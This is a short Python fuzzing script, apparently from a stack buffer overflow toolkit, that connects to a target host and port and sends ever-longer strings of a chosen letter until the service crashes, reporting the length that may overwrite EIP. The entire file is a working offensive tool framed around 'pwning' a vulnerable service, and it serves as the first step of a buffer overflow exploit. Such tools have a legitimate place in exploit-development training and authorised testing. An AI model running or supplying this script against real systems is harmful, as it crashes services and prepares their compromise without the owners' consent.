#!/usr/bin/python3
#_*_ coding: utf8 _*_
#Coded by @JoshuaProvoste

import socket,argparse

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""

def hi():
	print("""
 _____               _               
/  __ \             | |              
| /  \/_ __ __ _ ___| |__   ___ _ __ 
| |   | '__/ _` / __| '_ \ / _ \ '__|
| \__/\ | | (_| \__ \ | | |  __/ |   
 \____/_|  \__,_|___/_| |_|\___|_|  
 Fuzzing script to get a crash!                                                                                        
	""")

parser = argparse.ArgumentParser()
parser.add_argument("-ip","--host", type=str, required=True, help="IP host to pwn")
parser.add_argument("-sp","--port", type=int, required=True, help="Port of vulnerable service")
parser.add_argument("-lt","--letter", type=str, required=True, help="Specific letter to overwrite the EIP")
args = parser.parse_args()

if args.host and args.port and args.letter:
    hi()

for x in range(100, 10000, 100):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((args.host,args.port))
        sock.recv(1024).decode("utf-8")

        characters = args.letter * x
        payload_encoded = characters.encode("utf-8")
        sock.send(payload_encoded)
        
        print("Buffering with: "+str(len(characters))+" characters...",end="\r")
    except ConnectionRefusedError:
        print("Connection error. Review the IP address or port.")
        exit()
    except socket.timeout:
        sock.close()
        print("\nConnection error. Timeout!")
    except socket.error:
        sock.close()
        print("\nPwned? Maybe the binary crashed with "+str(len(characters))+" \"A\" characters :)")
        exit()
    except KeyboardInterrupt:
        sock.close()
        print("\n\nConnection closed. Bye!")
        exit()
